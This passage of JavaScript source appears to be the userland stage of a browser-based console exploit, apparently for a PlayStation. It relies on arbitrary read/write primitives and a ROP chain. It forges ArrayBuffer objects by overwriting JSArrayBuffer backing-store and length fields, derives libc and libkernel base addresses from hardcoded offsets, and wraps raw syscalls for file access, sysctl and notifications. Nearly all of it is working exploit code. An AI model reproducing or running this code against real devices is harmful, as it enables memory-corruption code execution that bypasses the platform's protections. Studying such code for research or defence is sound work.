          const size = field.size * field.count;
          const buf = ArrayBuffer.from(addr, size);

          switch (type) {
            case "Int8":
              return new Int8Array(buf);
            case "Uint8":
              return new Uint8Array(buf);
            case "Int16":
              return new Int16Array(buf);
            case "Uint16":
              return new Uint16Array(buf);
            case "Int32":
              return new Int32Array(buf);
            case "Uint32":
              return new Uint32Array(buf);
            case "Int64":
              return new BigInt64Array(buf);
            case "Uint64":
              return new BigUint64Array(buf);
            default:
              throw new Error(`Invalid type ${field.type}`);
          }
        } else {
          if (type.endsWith("*")) {
            type = type.slice(0, -1);
            addr = arw.view(target.addr).getBigUint64(field.offset, true);
          }

          if (Struct.registry.has(type)) {
            const struct = Struct.registry.get(type);
            return struct.new(addr);
          }

          switch (type) {
            case "Int8":
              return arw.view(addr).getInt8(0, true);
            case "Uint8":
              return arw.view(addr).getUint8(0, true);
            case "Int16":
              return arw.view(addr).getInt16(0, true);
            case "Uint16":
              return arw.view(addr).getUint16(0, true);
            case "Int32":
              return arw.view(addr).getInt32(0, true);
            case "Uint32":
              return arw.view(addr).getUint32(0, true);
            case "Int64":
              return arw.view(addr).getBigInt64(0, true);
            case "Uint64":
              return arw.view(addr).getBigUint64(0, true);
            default:
              throw new Error(`Invalid type ${field.type}`);
          }
        }
      },
      set: (target, prop, value) => {
        if (!isNaN(prop)) {
          const i = Number(prop);
          if (!value.hasOwnProperty("struct")) {
            throw new Error("Value is not a Struct");
          }

          if (target.struct.name !== value.struct.name) {
            throw new Error(`Expected ${target.struct.name} got ${value.struct.name} !!`);
          }

          mem.copy(target.addr + i * target.struct.sizeof, value.addr, target.struct.sizeof);
        } else {
          const field = target.struct.fields[prop];
          if (!field) return undefined;

          let type = field.type;
          let addr = target.addr + field.offset.bigint();

          if (field.count > 1) {
            const size = field.size * field.count;

            if (!ArrayBuffer.isView(value)) {
              throw new Error("Value is not a TypedArray");
            }

            if (value.buffer.byteLength !== size) {
              throw new Error(`Expected ${size} bytes got ${value.buffer.byteLength} !!`);
            }

            mem.copy(addr, value.buffer.getBackingStore(), size);
          } else {
            if (type.endsWith("*")) {
              if (typeof value !== "bigint") {
                throw new Error("Value is not a pointer");
              }

              arw.view(target.addr).setBigUint64(field.offset, value, true);
              return;
            }

            if (Struct.registry.has(type)) {
              const struct = Struct.registry.get(type);

              if (!value.hasOwnProperty("addr")) {
                throw new Error("Value is not a Struct");
              }

              mem.copy(addr, value.addr, struct.sizeof);
              return;
            }

            switch (type) {
              case "Int8":
                arw.view(addr).setInt8(0, value, true);
                break;
              case "Uint8":
                arw.view(addr).setUint8(0, value, true);
                break;
              case "Int16":
                arw.view(addr).setInt16(0, value, true);
                break;
              case "Uint16":
                arw.view(addr).setUint16(0, value, true);
                break;
              case "Int32":
                arw.view(addr).setInt32(0, value, true);
                break;
              case "Uint32":
                arw.view(addr).setUint32(0, value, true);
                break;
              case "Int64":
                arw.view(addr).setBigInt64(0, value, true);
                break;
              case "Uint64":
                arw.view(addr).setBigUint64(0, value, true);
                break;
              default:
                throw new Error(`Invalid type ${field.type}`);
            }
          }
        }

        return true;
      },
    });
  }

  static type_size(type) {
    if (type.endsWith("*")) {
      return 8;
    } else if (Struct.registry.has(type)) {
      return Struct.registry.get(type).sizeof;
    } else {
      return Struct.primitive_size(type);
    }
  }

  static type_align(type) {
    if (type.endsWith("*")) {
      return 8;
    } else if (Struct.registry.has(type)) {
      return Struct.registry.get(type).alignof;
    } else {
      return Struct.primitive_size(type);
    }
  }

  static primitive_size(type) {
    const bits = type.replace(/\D/g, "");
    if (bits % 8 !== 0) {
      throw new Error(`Invalid primitive type ${type}`);
    }

    return bits / 8;
  }
}
//#endregion
//#region Static
String.from = function (addr, size = 0x3fff) {
  if (addr === 0n) return "";

  const len = mem.strlen(addr, size);

  if (len === 0) return "";
  if (len === -1) throw new Error("Invalid null-terminated string !!");

  const buf = new Uint8Array(len);

  mem.copy(buf.buffer.getBackingStore(), addr, len);

  return btos(buf);
};

// Only use after arw.init
ArrayBuffer.from = function (addr, size = -1) {
  if (addr === 0n) {
    throw new RangeError("Empty addr !!");
  }

  const buf = new ArrayBuffer(0);

  while (buf.byteLength === 0) {
    const buf_addr = arw.addrof(buf);

    arw.view(buf_addr).setBigUint64(0x18, size.bigint(), true); // JSArrayBuffer.byte_length
    arw.view(buf_addr).setBigUint64(0x20, addr, true); // JSArrayBuffer.backing_store
    arw.view(buf_addr).setBigUint64(0x28, 0n, true); // JSArrayBuffer.extension
    arw.view(buf_addr).setBigUint64(0x30, 1n, true); // JSArrayBuffer.bit_field
  }

  if (buf.byteLength === 0) {
    logger?.debug(`buf_addr: ${buf_addr.hex()}`);
    logger?.debug(`addrof(buf): ${arw.addrof(buf).hex()}`);

    for (let i = 0; i < 9; i++) {
      logger?.debug(
        `buf_addr[${i}]: ${arw
          .view(buf_addr)
          .getBigUint64(i * 8, true)
          .hex()}`,
      );
    }

    for (let i = 0; i < 9; i++) {
      logger?.debug(
        `addrof(buf)[${i}]: ${arw
          .view(arw.addrof(buf))
          .getBigUint64(i * 8, true)
          .hex()}`,
      );
    }

    throw new Error(`Unable to fake ArrayBuffer for ${addr.hex()} with size ${size.hex()}`);
  }

  return buf;
};
//#endregion
//#region Functions
/** @param {number} ms */
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function errno() {
  return arw.view(fn._error.invoke()).getUint32(0, true);
}

/** @return {string} */
function strerror() {
  return fn._strerror.invoke(errno());
}

/** @param {number} nsec */
function nsleep(nsec) {
  const time = timespec.new();

  time.tv_sec = Math.floor(nsec / 1e9).bigint();
  time.tv_nsec = (nsec % 1e9).bigint();

  if (fn.nanosleep.invoke(time.addr) === -1) {
    throw new SyscallError(`Unable to sleep for ${nsec} nano seconds !!`);
  }

  mem.free(time.addr);
}

/** @param {string} str */
function stob(str) {
  return typeof TextEncoder !== "undefined" ? new TextEncoder().encode(str) : Uint8Array.from(str, (c) => c.charCodeAt());
}

/** @param {Uint8Array} u8 */
function btos(u8) {
  return typeof TextDecoder !== "undefined" ? new TextDecoder().decode(u8) : Array.from(u8, (c) => String.fromCharCode(c)).join("");
}

/**
 * @param {BigInt} func_addr
 * @return {BigInt}
 */
function base_addr(func_addr) {
  const module_info = ModuleInfoForUnwind.new();

  module_info.st_size = ModuleInfoForUnwind.sizeof.bigint();

  if (fn.sceKernelGetModuleInfoForUnwind.invoke(func_addr, 1, module_info.addr)) {
    throw new Error(`Unable to get ${func_addr.hex()} base addr !!`);
  }

  mem.free(module_info.addr);

  return module_info.seg0_addr;
}

function sdk_version() {
  const out = new Uint8Array(8);
  const name = new Int32Array([1, 0x34]);

  const out_len_addr = mem.alloc(8);

  arw.view(out_len_addr).setUint32(0, out.byteLength, true);

  fn.sysctl.invoke(name.buffer.getBackingStore(), name.length, out.buffer.getBackingStore(), out_len_addr, 0, 0);

  mem.free(out_len_addr);

  return {
    major: out[7],
    minor: out[6],
    toString() {
      return `${this.major}.${this.minor.toString(16).padStart(2, "0")}`;
    },
  };
}

/** @param {string} msg */
function notify(msg) {
  const request = NotificationRequest.new();

  request.message.set(stob(msg));

  const fd = fn.open.invoke("/dev/notification0", 1, 0);
  if (fd < 0) {
    throw new SyscallError("Unable to open /dev/notification0 !!");
  }

  fn.write.invoke(fd, request.addr, NotificationRequest.sizeof);
  fn.close.invoke(fd);

  mem.free(request.addr);
}

/** @param {string} path */
function read_file(path, flags = 0, mode = 0) {
  const fd = fn.open.invoke(path, flags, mode);
  if (fd === -1) {
    throw new SyscallError(`Unable to open ${path} !!`);
  }

  const info = stat.new();

  if (fn.fstat.invoke(fd, info.addr) === -1) {
    throw new SyscallError(`Unable to get stat of fd ${fd} !!`);
  }

  const data = new Uint8Array(info.st_size.number());

  const n = fn.read.invoke(fd, data.buffer.getBackingStore(), info.st_size);
  if (n !== info.st_size) {
    throw new SyscallError(`Expected ${info.st_size.hex()} got ${n.hex()} !!`);
  }

  if (fn.close.invoke(fd)) {
    throw new SyscallError(`Unable to close fd ${fd} !!`);
  }

  mem.free(info.addr);

  return data;
}

/**
 * @param {ArrayBufferView<ArrayBufferLike>} data
 * @param {string} path
 */
function write_file(data, path, flags = 0, mode = 0) {
  if (!ArrayBuffer.isView(data)) {
    throw new Error("Data not a TypedArray");
  }

  const fd = fn.open.invoke(path, flags, mode);
  if (fd === -1) {
    throw new SyscallError(`Unable to open ${path} !!`);
  }

  const n = fn.write.invoke(fd, data.buffer.getBackingStore(), data.byteLength);
  if (n !== data.byteLength) {
    throw new SyscallError(`Expected ${data.byteLength.bigint().hex()} got ${n.hex()} !!`);
  }

  if (fn.close.invoke(fd)) {
    throw new SyscallError(`Unable to close fd ${fd} !!`);
  }
}

/** @param {string} path */
function read_file_str(path, flags = 0, mode = 0) {
  const data = read_file(path, flags, mode);
  return btos(data);
}

/**
 * @param {string} str
 * @param {string} path
 */
function write_file_str(str, path, flags = 0, mode = 0) {
  const data = stob(str);
  write_file(data, path, flags, mode);
}
//#endregion
//#region Structs
const timespec = new Struct("timespec", [
  { type: "Int64", name: "tv_sec" },
  { type: "Int64", name: "tv_nsec" },
]);

const stat = new Struct("stat", [
  { type: "Uint32", name: "st_dev" },
  { type: "Uint32", name: "st_ino" },
  { type: "Uint16", name: "st_mode" },
  { type: "Uint16", name: "st_nlink" },
  { type: "Uint32", name: "st_uid" },
  { type: "Uint32", name: "st_gid" },
  { type: "Uint32", name: "st_rdev" },
  { type: "timespec", name: "st_atim" },
  { type: "timespec", name: "st_mtim" },
  { type: "timespec", name: "st_ctim" },
  { type: "Int64", name: "st_size" },
  { type: "Int64", name: "st_blocks" },
  { type: "Int32", name: "st_blksize" },
  { type: "Uint32", name: "st_flags" },
  { type: "Uint32", name: "st_gen" },
  { type: "timespec", name: "st_birthtim" },
]);

const ModuleInfoForUnwind = new Struct("ModuleInfoForUnwind", [
  { type: "Uint64", name: "st_size" },
  { type: "Uint8", name: "name", count: 256 },
  { type: "Uint64", name: "eh_frame_hdr_addr" },
  { type: "Uint64", name: "eh_frame_addr" },
  { type: "Uint64", name: "eh_frame_size" },
  { type: "Uint64", name: "seg0_addr" },
  { type: "Uint64", name: "seg0_size" },
]);

const NotificationRequest = new Struct("NotificationRequest", [
  { type: "Int32", name: "type" },
  { type: "Int32", name: "reqId" },
  { type: "Int32", name: "priority" },
  { type: "Int32", name: "msg_id" },
  { type: "Int32", name: "target_id" },
  { type: "Int32", name: "user_id" },
  { type: "Int32", name: "unk1" },
  { type: "Int32", name: "unk2" },
  { type: "Int32", name: "app_id" },
  { type: "Int32", name: "error_num" },
  { type: "Int32", name: "unk3" },
  { type: "Uint8", name: "use_icon_image_uri" },
  { type: "Uint8", name: "message", count: 1024 },
  { type: "Uint8", name: "icon_uri", count: 1024 },
  { type: "Uint8", name: "unk", count: 1024 },
]);
//#endregion

logger?.info("===USERLAND===");
logger?.info(`Agent: ${navigator.userAgent}`);

try {
  arw.init();
  rop.init();

  logger?.info(`eboot base: ${eboot_base.hex()}`);

  const malloc_addr = arw.view(eboot_base).getBigUint64(0x2a65e70, true);

  libc_base = malloc_addr - 0x5c20n;
  logger?.info(`libc base: ${libc_base.hex()}`);

  const _close_addr = arw.view(libc_base).getBigUint64(0x113b98, true);

  syscall_wrapper = _close_addr + 7n;
  logger?.debug(`syscall_wrapper: ${syscall_wrapper.hex()}`);

  fn.sceKernelGetModuleInfoForUnwind = new NativeFunction(libc_base + 0xcc990n, "number");

  libkernal_base = base_addr(_close_addr);
  logger?.info(`libkernel base: ${libkernal_base.hex()}`);

  fn._error = new NativeFunction(eboot_base + 0x215da30n, "bigint");
  fn._strerror = new NativeFunction(eboot_base + 0x215ef40n, "string");

  fn.read = new NativeFunction(0x3, "bigint");
  fn.write = new NativeFunction(0x4, "bigint");
  fn.open = new NativeFunction(0x5, "number");
  fn.close = new NativeFunction(0x6, "number");
  fn.unlink = new NativeFunction(0xa, "number");
  fn.getpid = new NativeFunction(0x14, "number");
  fn.ioctl = new NativeFunction(0x36, "number");
  fn.fstat = new NativeFunction(0xbd, "number");
  fn.sysctl = new NativeFunction(0xca, "number");
  fn.nanosleep = new NativeFunction(0xf0, "number");

  pid = fn.getpid.invoke();
  logger?.info(`Process ID: ${pid}`);

  version = sdk_version();
  logger?.info(`SDK version: ${version}`);
} catch (e) {
  logger?.error(e.stack);
  mem.free_all();
  throw e;
}

logger?.info("===END===");
